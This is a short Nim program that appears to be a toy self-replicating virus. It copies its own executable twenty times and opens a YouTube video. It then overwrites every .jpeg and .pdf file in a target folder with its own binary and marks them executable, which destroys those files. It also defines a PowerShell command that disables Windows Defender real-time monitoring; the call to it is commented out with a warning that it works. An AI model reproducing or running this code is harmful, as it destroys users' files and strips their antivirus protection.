import std/os
import std/browsers
import osproc

proc Rasputin() =
    let url = "https://www.youtube.com/watch?v=16y1AkoZkmQ"
    openDefaultBrowser(url)


proc disableWindowsDefender() =
    var command = "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"

    discard execProcess(command, options={ProcessOption.poEvalCommand, ProcessOption.poDaemon})

proc targetExtensions(filename: string, directory: string, extensions: seq[string]) =
    for extension in extensions:
        for file in walkDir(directory):
            var ext = splitFile(file.path)[2]
            if ext == extension:
                copyFileWithPermissions(filename, file.path)
                var command = "chmod +x " & file.path
                discard execProcess(command, options={ProcessOption.poEvalCommand})
            

proc main() =

    let filename = getAppFilename()
    let directory = getAppDir()
    var extensionsToTarget: seq[string] = @[".jpeg", ".pdf"]
    const MAX_ITERATIONS = 20


    # create a directory for generated files
    let generatedDir = directory & "/generated-files"

    discard existsOrCreateDir(generatedDir)

    for i in 1..MAX_ITERATIONS:
        var newfile = filename & $i
        copyFile(filename, newfile)
        copyFileToDir(newfile, generatedDir)
        discard execProcess("chmod +x ./generated-files/*", options={ProcessOption.poEvalCommand})
        removeFile(newfile)

    Rasputin() # RA RA RASPUTIN
    # disableWindowsDefender() # THIS ACTUALLY WORKS, BE CAREFUL
    targetExtensions(filename,"./target", extensionsToTarget)


main()
